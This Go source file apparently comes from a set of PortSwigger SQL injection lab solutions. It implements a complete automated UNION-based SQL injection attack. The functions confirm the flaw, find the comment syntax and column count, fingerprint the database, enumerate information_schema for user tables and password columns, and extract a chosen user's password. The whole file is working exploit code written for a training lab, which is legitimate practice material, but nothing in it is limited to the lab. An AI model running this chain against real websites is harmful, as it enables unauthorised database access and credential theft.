package sqli

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"slices"
	"strings"

	"github.com/PuerkitoBio/goquery"
	"github.io/kinasr/pen_payloads/PortSwiggerLabs/SQLi/lab_7/constant"
	"github.io/kinasr/pen_payloads/PortSwiggerLabs/SQLi/lab_7/utility"
)

func DoesVulnerabilityExist(client *utility.HTTPClient, targetURL string) (bool, error) {
	response, err := client.SendGetRequest(targetURL + "'")
	if err != nil {
		return false, err
	}
	defer utility.SafeClose(response.Body)
	if response.StatusCode == http.StatusInternalServerError {
		// If we get a 500 error, it indicates that the server is vulnerable to SQL injection
		return true, nil
	}
	return false, nil
}

func FindCommentStyle(client *utility.HTTPClient, targetURL string) (string, error) {
	// Test each comment style
	for _, style := range constant.CommentStyles {
		testURL := targetURL + "'" + style
		response, err := client.SendGetRequest(utility.URLEncode(testURL))
		if err != nil {
			return "", err
		}
		defer utility.SafeClose(response.Body)
		if response.StatusCode == http.StatusOK {
			// If we get a 200 OK, it indicates that the comment style is valid
			return style, nil
		}
	}
	return "", fmt.Errorf("could not determine comment style, none of the styles worked: %v", constant.CommentStyles)
}

// FindNumOfColumns determines the number of columns in the vulnerable query result set
// using the ORDER BY technique.
func FindNumOfColumns(client *utility.HTTPClient, targetURL string, commentStyle string) (int, error) {
	for col := 1; col <= 100; col++ { // Limit search to 100 columns
		testURL := targetURL + "' ORDER BY " + fmt.Sprintf("%d", col) + commentStyle
		response, err := client.SendGetRequest(utility.URLEncode(testURL))
		if err != nil {
			return 0, err
		}
		defer utility.SafeClose(response.Body)
		if response.StatusCode == http.StatusInternalServerError {
			// If we get a 500 error, it indicates that the ORDER BY index is out of bounds
			if col == 1 {
				return 0, fmt.Errorf("no columns found, the first column is out of bounds")
			}
			return col - 1, nil
		}
	}
	return 0, fmt.Errorf("could not determine number of columns")
}

func FindDB(client *utility.HTTPClient, targetURL string, commentStyle string, numOfColumns int) (constant.Database, error) {
	// Test each database type
	for _, db := range constant.Databases {
		// If a comment style is provided, only test databases that use that style
		if commentStyle != "" && !slices.Contains(db.Comment, commentStyle) {
			continue
		}

		// Construct the UNION SELECT payload with NULLs and the database version function
		var testURL string
		selectColumns := make([]string, numOfColumns)
		for i := range selectColumns {
			selectColumns[i] = "NULL"
		}
		if db.Name == "Oracle" {
			selectColumns[0] = "version"
			testURL = targetURL + "' UNION SELECT " + strings.Join(selectColumns, ",") + " FROM v$instance" + db.Comment[0]
		} else {
			selectColumns[0] = db.VersionFunction
			testURL = targetURL + "' UNION SELECT " + strings.Join(selectColumns, ",") + commentStyle
		}

		response, err := client.SendGetRequest(utility.URLEncode(testURL))
		if err != nil {
			return constant.Database{}, err
		}
		defer utility.SafeClose(response.Body)
		if response.StatusCode == http.StatusOK {
			return db, nil
		}
	}
	return constant.Database{}, fmt.Errorf("could not determine database version function")
}

func FindUsersTableName(client *utility.HTTPClient, targetURL string, db constant.Database, numOfColumns int) (string, error) {
	// If the database does not support information_schema, we cannot retrieve the users table
	if db.Name == "Oracle" {
		return "", fmt.Errorf("the database %s does not support information_schema", db.Name)
	}

	// Construct the UNION SELECT payload with NULLs and the users table
	selectColumns := make([]string, numOfColumns)
	for i := range selectColumns {
		selectColumns[i] = "NULL"
	}
	selectColumns[0] = "TABLE_NAME"
	testURL := targetURL + "' UNION SELECT " + strings.Join(selectColumns, ",") + " FROM information_schema.tables" + db.Comment[0]
	response, err := client.SendGetRequest(utility.URLEncode(testURL))
	if err != nil {
		return "", err
	}
	defer utility.SafeClose(response.Body)

	// Check if the response contains the users table
	if response.StatusCode == http.StatusOK {
		usersTableName, err := findTextInTH(response.Body, "users_")
		if err != nil {
			return "", fmt.Errorf("failed to find users table: %w", err)
		}

		return usersTableName, nil
	}
	return "", fmt.Errorf("could not retrieve users table")
}

func FindUsernameAndPasswordColumnNames(client *utility.HTTPClient, targetURL string, db constant.Database, usersTableName string, numOfColumns int) (string, string, error) {
	// Construct the UNION SELECT payload with NULLs and the username and password columns
	selectColumns := make([]string, numOfColumns)
	for i := range selectColumns {
		selectColumns[i] = "NULL"
	}
	selectColumns[0] = "COLUMN_NAME"
	testURL := targetURL + "' UNION SELECT " + strings.Join(selectColumns, ",") + " FROM information_schema.columns WHERE table_name='" + usersTableName + "'" + db.Comment[0]
	response, err := client.SendGetRequest(utility.URLEncode(testURL))
	if err != nil {
		return "", "", err
	}

	if response.StatusCode == http.StatusOK {
		bodyBytes, err := io.ReadAll(response.Body)
		if err != nil {
			return "", "", fmt.Errorf("failed to read response body: %w", err)
		}
		utility.SafeClose(response.Body)

		username, err := findTextInTH(io.NopCloser(bytes.NewBuffer(bodyBytes)), "username_")
		if err != nil {
			return "", "", fmt.Errorf("failed to find username column: %w", err)
		}

		password, err := findTextInTH(io.NopCloser(bytes.NewBuffer(bodyBytes)), "password_")
		if err != nil {
			return "", "", fmt.Errorf("failed to find password column: %w", err)
		}

		utility.SafeClose(response.Body)

		return username, password, nil
	}
	return "", "", fmt.Errorf("could not retrieve username and password columns")
}

func FindPasswordForUser(client *utility.HTTPClient, targetURL string, db constant.Database, usersTableName string, usernameColumn string, passwordColumn string, user string, numOfColumns int) (string, error) {
	// Construct the UNION SELECT payload with NULLs and the password for the specified user
	selectColumns := make([]string, numOfColumns)
	for i := range selectColumns {
		selectColumns[i] = "NULL"
	}
	selectColumns[0] = passwordColumn
	testURL := targetURL + "' UNION SELECT " + strings.Join(selectColumns, ",") + " FROM " + usersTableName + " WHERE " + usernameColumn + " = '" + user + "'" + db.Comment[0]
	response, err := client.SendGetRequest(utility.URLEncode(testURL))
	if err != nil {
		return "", err
	}
	defer utility.SafeClose(response.Body)

	if response.StatusCode == http.StatusOK {
		password, err := findTextInTH(response.Body, "")
		if err != nil {
			return "", fmt.Errorf("failed to find password for user %s: %w", user, err)
		}
		return password, nil
	}
	return "", fmt.Errorf("could not retrieve password for user %s", user)
}

func findTextInTH(responseBody io.Reader, prefix string) (string, error) {
	doc, err := goquery.NewDocumentFromReader(responseBody)
	if err != nil {
		return "", fmt.Errorf("failed to parse response HTML: %w", err)
	}

	foundText := ""
	doc.Find("th").EachWithBreak(func(_ int, th *goquery.Selection) bool {
		thText := strings.TrimSpace(th.Text())
		if strings.HasPrefix(thText, prefix) {
			foundText = thText
			return false // Stop after finding the first match
		}
		return true // Continue searching
	})

	if foundText == "" {
		return "", fmt.Errorf("no column found with prefix %s", prefix)
	}

	return foundText, nil
}
